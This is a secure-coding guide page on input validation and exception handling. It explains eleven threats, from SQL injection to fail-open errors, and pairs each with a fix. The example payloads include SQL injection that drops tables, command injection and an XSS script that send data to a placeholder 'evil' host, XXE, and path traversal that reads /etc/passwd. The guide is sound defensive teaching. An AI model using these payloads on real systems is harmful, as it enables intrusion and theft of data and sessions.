# C3: Validate all Input & Handle Exceptions - Threats Addressed

## Table of Contents
- [What This Control Defends Against](#understanding)
- [The Threats, One by One](#threats)
- [Poor Exception Handling as Its Own Threat](#exception-risks)
- [How Each Threat Is Neutralised](#mapping)

## What This Control Defends Against

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the attack examples below are shown so you understand exactly what C3 prevents, and can find and fix these issues in systems you own or are authorised to test.

C3 is a defensive control, so its "attack vectors" are really the **threats it addresses**. Almost all of them share one root cause: **untrusted input reaches an interpreter that treats part of it as code**—a SQL engine, an HTML renderer, a shell, an LDAP directory, an XML parser, or a deserializer. The final threat, poor exception handling, is what turns a contained error into an information leak or an access-control bypass.

For each threat below you will see the *insecure* pattern that lets it in, an example payload, and the C3 element that shuts it down. The implementation details live on the [How to Implement](prevention.md) and [Code Examples](examples.md) pages.

## The Threats, One by One

### 1. SQL Injection

Untrusted input is concatenated into a SQL statement, so the attacker's text changes the query's structure.

```sql
-- Application builds: "SELECT * FROM users WHERE name = '" + input + "'"
Input:  ' OR '1'='1
Query:  SELECT * FROM users WHERE name = '' OR '1'='1'   -- returns every row

Input:  '; DROP TABLE users; --
Query:  SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
```

**Payoff**: authentication bypass, dumping or modifying the whole database, sometimes command execution on the DB host.
**C3 fix**: parameterised queries / prepared statements / a safe ORM — the data is sent to the database separately from the command and can never alter it.

### 2. NoSQL Injection

Document stores are just as injectable when a raw request is used to build a query object or filter.

```javascript
// Express + MongoDB: req.body.username is an object, not a string
// { "username": { "$ne": null }, "password": { "$ne": null } }
db.users.find({ username: req.body.username, password: req.body.password });
// $ne null matches ANY user -> authentication bypass

// Operator injection in a JSON body:
{ "age": { "$gt": "" } }        // returns all documents
```

**Payoff**: authentication bypass, unauthorized data access, query-operator abuse.
**C3 fix**: enforce expected types (a username must be a *string*), validate against a schema, and use query builders that separate operators from data.

### 3. OS Command Injection

Input is passed to a shell, so shell metacharacters run extra commands.

```bash
# Application runs: os.system("ping -c 1 " + host)
Input:  127.0.0.1; cat /etc/passwd
Runs:   ping -c 1 127.0.0.1; cat /etc/passwd

Input:  127.0.0.1 && curl http://evil/$(whoami)
Runs:   ping -c 1 127.0.0.1 && curl http://evil/<attacker exfil>
```

**Payoff**: arbitrary command execution, full host compromise, data exfiltration.
**C3 fix**: avoid the shell entirely—call the program with an argument array (no shell interpretation)—and allow-list the acceptable input (e.g. a valid IP/hostname).

### 4. LDAP Injection

Input is placed into an LDAP search filter, so filter metacharacters change the query logic.

```
# Filter built as: "(&(uid=" + user + ")(password=" + pass + "))"
user:  *)(uid=*))(|(uid=*
Filter: (&(uid=*)(uid=*))(|(uid=*)(password=...))   -- matches everyone

user:  admin)(&))            -- always-true filter, auth bypass
```

**Payoff**: authentication bypass, enumeration of directory entries, disclosure of attributes.
**C3 fix**: escape LDAP special characters (`* ( ) \ NUL`) using the platform's LDAP encoder, and allow-list the input format.

### 5. Cross-Site Scripting (XSS)

Untrusted input is written into an HTML page without context-aware encoding, so the browser runs it as script.

```html
<!-- Application prints: <div>Hello, USERNAME</div> -->
Input:  <script>fetch('https://evil/'+document.cookie)</script>
Result: the script runs in the victim's session -> cookie/session theft

<!-- Attribute context -->
Input:  " onmouseover="alert(document.domain)
Result: injected event handler executes
```

**Payoff**: session hijacking, actions performed as the victim, credential theft, defacement.
**C3 fix**: context-aware output encoding (HTML body, attribute, JS, URL, CSS), template auto-escaping, and a vetted sanitiser such as DOMPurify for HTML that must be allowed.

### 6. XML External Entity (XXE) Injection

An XML parser with external-entity resolution enabled processes attacker XML that references local files or internal URLs.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>        <!-- parser inlines /etc/passwd into the response -->

<!-- SSRF variant -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

**Payoff**: local file disclosure, server-side request forgery into internal systems, sometimes denial of service ("billion laughs").
**C3 fix**: configure the parser to disable DTDs and external entities before parsing untrusted XML.

### 7. Path Traversal / Directory Traversal

Untrusted input is used to build a file path, so `../` sequences escape the intended directory.

```
# Application opens: "/var/app/files/" + filename
filename:  ../../../../etc/passwd        -> reads /etc/passwd
filename:  ..%2f..%2f..%2fetc%2fpasswd   -> URL-encoded bypass
filename:  ....//....//etc/passwd        -> filter-evasion variant
```

**Payoff**: reading arbitrary files (source, secrets, credentials), and in write contexts, overwriting files.
**C3 fix**: canonicalise the path first, then confirm it stays within the intended base directory; allow-list filenames; never use raw user input as a path.

### 8. Insecure Deserialization

Attacker-controlled bytes are handed to a native, type-permissive deserializer, which instantiates objects (and side effects) the attacker chose.

```python
# Python: pickle will construct whatever the stream says
data = pickle.loads(request.body)     # attacker crafts a stream whose
                                      # __reduce__ runs os.system(...) -> RCE

// Java: readObject on untrusted bytes + a gadget chain on the classpath -> RCE
ObjectInputStream in = new ObjectInputStream(request.getInputStream());
Object o = in.readObject();
```

**Payoff**: remote code execution, object injection, denial of service.
**C3 fix**: do not natively deserialize untrusted data. Use data-only formats (JSON) with a strict schema and explicit field mapping; if a binary format is unavoidable, use one without code-execution semantics and enforce type allow-lists.

### 9. Header, Log, and Protocol Injection (CRLF)

Input containing newline characters is written into a response header or a log line, splitting it into attacker-controlled content.

```
Input:  value%0d%0aSet-Cookie:%20sessionid=attacker
Header: X-Thing: value
        Set-Cookie: sessionid=attacker      <- injected header

# Log forging: a newline lets the attacker fake log entries
Input:  admin\n2026-01-01 12:00:00 INFO  user 'admin' logged in
```

**Payoff**: response splitting, cookie injection, cache poisoning, forged/obfuscated logs.
**C3 fix**: reject or strip CR/LF (and other control characters) from anything placed into headers or logs; encode before writing.

## Poor Exception Handling as Its Own Threat

Even with perfect input handling, the *way* a system reacts to errors is itself an attack surface. Two distinct risks:

### 10. Information Disclosure via Verbose Errors

An unhandled exception returns internal detail straight to the attacker.

```
GET /api/orders?id=' HTTP/1.1

HTTP/1.1 500 Internal Server Error
{
  "exception": "psycopg2.ProgrammingError: syntax error at or near \"'\"",
  "query": "SELECT * FROM orders WHERE id=''",
  "file": "/srv/app/orders.py, line 88",
  "dsn": "postgres://app:S3cr3t@db.internal:5432/prod"
}
```

**Payoff**: exact framework/DB versions, file paths, schema, internal hostnames, sometimes live credentials—a complete map for the next step, and confirmation that an injection point exists.
**C3 fix**: return a generic message plus a correlation id; log the detail server-side only.

### 11. Fail-Open on Error (Security Bypass)

When a security check throws, code that defaults to "allow" hands the attacker exactly what they want.

```python
try:
    if not token_is_valid(token):     # if this throws for a malformed token...
        return deny()
except Exception:
    pass                              # ...execution falls through to "allowed"
grant_access()                        # attacker only needs to make the check crash
```

**Payoff**: authentication/authorization bypass triggered simply by forcing an exception (oversized input, malformed token, dependency timeout).
**C3 fix**: fail closed—any exception during a security decision must result in denial.

## How Each Threat Is Neutralised

| # | Threat | Root cause | C3 control that stops it |
|---|--------|-----------|--------------------------|
| 1 | SQL injection | Input concatenated into SQL | Parameterised queries / safe ORM |
| 2 | NoSQL injection | Untyped input in a query object | Type + schema validation, query builders |
| 3 | OS command injection | Input passed to a shell | Argument arrays, no shell, allow-list |
| 4 | LDAP injection | Input in a search filter | LDAP-encode metacharacters, allow-list |
| 5 | XSS | Input rendered as HTML/JS | Context-aware output encoding, sanitiser |
| 6 | XXE | External entities enabled | Disable DTDs/external entities |
| 7 | Path traversal | Input used as a file path | Canonicalise then confine to base dir |
| 8 | Insecure deserialization | Native deserialize of untrusted bytes | Data-only formats + strict schema |
| 9 | CRLF / header / log injection | Newlines in headers/logs | Strip/reject control chars, encode |
| 10 | Verbose error disclosure | Raw exceptions to client | Generic errors + server-side logging |
| 11 | Fail-open bypass | Errors treated as "allow" | Fail closed on every security check |

> **Remember the central rule:** for injection and XSS, input validation *reduces* the surface but does not close it. The threat is actually neutralised at the sink—by parameterisation and context-aware encoding. Do both.

## Key Takeaways

1. **One root cause, many names** — injection, XSS, XXE, traversal, and deserialization are all untrusted input reaching an interpreter.
2. **The real fix lives at the sink** — parameterise queries and encode output for the exact context; validation alone is not enough.
3. **Types and allow-lists stop whole families** — enforcing "a username is a short string" defeats NoSQL operator injection outright.
4. **Errors are an attack surface too** — verbose exceptions leak the map; fail-open exceptions hand over the keys.
5. **Fail closed, log privately** — deny on error and keep the detail out of the client's hands.

## Next Steps

- **[How to Implement](prevention.md)**: Build validation, encoding, and exception handling into your app
- **[Code Examples](examples.md)**: Insecure vs. secure code for each threat
- **[Proactive Controls](/learn/proactive)**: Return to the full control set
- **[Practice](/practice)**: Apply what you have learned
